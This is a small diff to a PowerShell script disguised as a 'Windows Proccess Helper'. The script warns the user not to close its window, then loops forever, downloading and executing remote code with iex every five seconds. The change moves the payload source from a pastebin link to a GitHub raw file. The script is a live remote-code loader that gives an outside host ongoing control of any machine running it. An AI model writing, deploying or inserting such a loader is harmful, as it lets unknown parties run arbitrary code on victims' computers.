@@ -1,7 +1,7 @@
 function run {
 Write-Host "Windows Proccess Helper"
 Write-Host "DO NOT CLOSE! MINIMIZE IF NECCESSARY" -ForeGroundColor Red
-iex((New-Object System.Net.WebClient).DownloadString("https://pastebin.com/raw/nBjZ6EJB"))
+iex((New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/DatSystems-Technology/TS/refs/heads/main/TS-Script"))
 powershell Start-Sleep 5
 Clear-Host
 ;run
